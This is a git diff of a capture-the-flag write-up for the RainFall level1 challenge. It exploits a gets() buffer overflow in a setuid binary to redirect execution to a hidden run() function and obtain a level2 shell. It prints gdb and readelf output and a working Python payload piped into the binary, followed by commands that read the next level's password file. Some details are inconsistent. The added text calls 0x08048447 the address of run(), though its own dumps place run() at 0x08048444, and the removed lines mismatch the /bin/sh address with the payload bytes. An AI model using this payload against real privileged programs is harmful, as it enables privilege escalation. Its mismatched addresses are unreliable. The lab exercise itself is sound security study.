@@ -14,7 +14,7 @@ Again, the binary is a setuid and setgid executable owned by the next level user
 Let's run the binary and see what it does.
 
 ```bash
-level1@RainFall:~$ ./level1 
+level1@RainFall:~$ ./level1
 dsa
 ```
 
@@ -60,30 +60,13 @@ dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd
 Segmentation fault (core dumped)
 ```
 
-But that is not all: if we run readelf on the binary, we can actually see a ghost function in the program that is never called under the normal execution flow:
+But that is not all: if we run readelf on the binary, we can actually see a ghost function in the program, `run()`, that is never called under the normal execution flow:
 
 ```bash
-level1@RainFall:~$ readelf -a ./level1
 level1@RainFall:~$ readelf -a ./level1 | grep FUNC
-     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@GLIBC_2.0 (2)
-     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@GLIBC_2.0 (2)
-     3: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@GLIBC_2.0 (2)
-     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.0 (2)
-    31: 080483c0     0 FUNC    LOCAL  DEFAULT   13 __do_global_dtors_aux
-    34: 08048420     0 FUNC    LOCAL  DEFAULT   13 frame_dummy
-    39: 08048520     0 FUNC    LOCAL  DEFAULT   13 __do_global_ctors_aux
-    45: 08048510     2 FUNC    GLOBAL DEFAULT   13 __libc_csu_fini
-    46: 08048512     0 FUNC    GLOBAL HIDDEN    13 __i686.get_pc_thunk.bx
-    48: 00000000     0 FUNC    GLOBAL DEFAULT  UND gets@@GLIBC_2.0
+	...
     50: 08048444    60 FUNC    GLOBAL DEFAULT   13 run
-    51: 0804854c     0 FUNC    GLOBAL DEFAULT   14 _fini
-    52: 00000000     0 FUNC    GLOBAL DEFAULT  UND fwrite@@GLIBC_2.0
-    55: 00000000     0 FUNC    GLOBAL DEFAULT  UND system@@GLIBC_2.0
-    59: 00000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@@GLIBC_
-    60: 080484a0    97 FUNC    GLOBAL DEFAULT   13 __libc_csu_init
-    62: 08048390     0 FUNC    GLOBAL DEFAULT   13 _start
-    66: 08048480    23 FUNC    GLOBAL DEFAULT   13 main
-    68: 080482f8     0 FUNC    GLOBAL DEFAULT   11 _init
+	...
 ```
 
 And this is the corresponding disassembly:
@@ -91,10 +74,10 @@ And this is the corresponding disassembly:
 ```bash
 level1@RainFall:~$ gdb -batch ./level1 -ex 'disas run'
 Dump of assembler code for function run:
-   0x08048444 <+0>:	push   %ebp
-   0x08048445 <+1>:	mov    %esp,%ebp
-   0x08048447 <+3>:	sub    $0x18,%esp
-   0x0804844a <+6>:	mov    0x80497c0,%eax
+   0x08048444 <+0>:		push   %ebp
+   0x08048445 <+1>:		mov    %esp,%ebp
+   0x08048447 <+3>:		sub    $0x18,%esp
+   0x0804844a <+6>:		mov    0x80497c0,%eax
    0x0804844f <+11>:	mov    %eax,%edx
    0x08048451 <+13>:	mov    $0x8048570,%eax
    0x08048456 <+18>:	mov    %edx,0xc(%esp)
@@ -109,52 +92,49 @@ Dump of assembler code for function run:
 End of assembler dump.
 ```
 
-A quick look at the .rodata section shows us that the string located at `0x8048570` is actually `"/bin/sh"`: in short, if we can call this function, we can execute a shell running as user level2. Running it manually from `gdb` by moving the instruction pointer is useless, since we lose the elevated privileges granted by the setuid bit. Instead, we can exploit the buffer overflow vulnerability in `gets()` to overwrite the return address of `main()` to point to `run()`, effectively hijacking the program's control flow to execute our desired function.
+So if we can find a way to call this function, we should get a shell running with level2 privileges. But how?
 
-How to do that?
+We can rule out the possibility of moving the instruction pointer to `run()` manually using `gdb`, since the program would lose the elevated privileges granted by the setuid bit. Instead, we can exploit the buffer overflow vulnerability in `gets()` to overwrite the **return address** of `main()` to point to `run()`, effectively hijacking the program's control flow to execute our desired function.
 
-When a function is called, the return address (the address to which the program should return after the function call) is stored on the stack. If we can overflow the buffer and overwrite this return address, we can redirect the program's execution to a location of our choosing; what we typically want is to redirect the return address to point to a system call of a shell-spawning function (like `system("/bin/sh")`).
+When a function is called, the return address (the address to which the program should return after the function call) is stored on the stack. If we can overflow the buffer and overwrite this return address, we can redirect the program's execution to a location of our choosing; in this scenario, the `run()` function.
+
+Let's have a look at the stack layout during the execution of `main()` using `gdb`:
+
+```
+HIGH addresses 0xffffffff
+┌─────────────────┐
+│ return address  │  ← what we need to overwrite
+├─────────────────┤
+│   saved EBP     │
+├─────────────────┤  ← EBP points here at function entry
+│   (padding)     │  ← area to store parameters before function call (12 bytes?)
+├─────────────────┤
+│   buf[63]       │  ← last byte of buffer (ESP+79)
+│   buf[62]       │
+│      ...        │
+│   buf[1]        │
+│   buf[0]        │  ← first byte of buffer (ESP+16)
+└─────────────────┘  ← ESP points here after "sub $0x50,%esp"
+LOW addresses 0x00000000
+```
+
+So we need to pass a payload to `gets()` that fills the buffer and overwrites the saved EBP with garbage value, and then overwrites the return address with the address of `run()`. This means at least 64 bytes for the buffer, then some padding, then the 4 bytes of the saved EBP, and finally the 4 bytes of the return address.
 
 The winning payload should look like this:
 
-> [Padding to fill the buffer (garbage)] + [Address of system()] + [Return address after system() (garbage)] + [Address of "/bin/sh"]
+> [64 bytes] + [x bytes] + [Address of `run()`]
 
-The padding and the return address after system() can be arbitrary values, as they are not used. The important parts are the address of `system()` and the address of the string `"/bin/sh"`, which can be determined using `gdb`:
+Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the padding is 12 bytes long, which gives us the following payload following the x86 architecture:
 
-```bash
-level1@RainFall:~$ gdb -batch ./level1 -ex 'info functions system'
-All functions matching regular expression "system":
+> `'A' * 76 + 0x08048447`
 
-Non-debugging symbols:
-0x08048360  system
-0x08048360  system@plt
-```
-
-To find the address of the string `"/bin/sh"`, the program must be running:
-
-```bash
-(gdb) b *0x08048480
-Breakpoint 1 at 0x8048480
-(gdb) run
-Starting program: /home/user/level1/level1 
-
-Breakpoint 1, 0x08048480 in main ()
-(gdb) x/s "/bin/sh"
-0x804a008:	 "/bin/sh"
-```
-
-We have found the address of the string `system()`: `0x08048360` and the address of `"/bin/sh"`: `0x0804a008`.
-
-Now we need to determine the exact amount of padding needed to overflow the buffer and overwrite the return address. After a bit of trial and error, we find that the right amount is 76 bytes, which gives us the following payload following the x86 architecture:
-
-> `'A' * 76 + 0x08048360 + fake_return_address + 0x0804a008
-
-Importantly, the addresses must be in little-endian format, as the system architecture is little-endian. Thus, `0x08048360` becomes `\x60\x83\x04\x08` and `0x0804a008` becomes `\x08\xa0\x04\x08`.
+Where `0x08048447` is the address of the `run()` function. Importantly, the address must be in hexadecimal and little-endian format, as the system architecture is little-endian. Thus, `0x08048447` becomes `\x47\x84\x04\x08`.
 
 We can create this payload using Python:
 
 ```bash
-level1@RainFall:~$ (python -c 'print("A"*76 + "\x60\x83\x04\x08" + "BBBB" + "\x84\x85\x04\x08")'; cat) | ./level1
+level1@RainFall:~$ (python -c 'print("A"*76 + "\x47\x84\x04\x08")'; cat) | ./level1
+Good... Wait what?
 whoami
 level2
 cat /home/user/level2/.pass
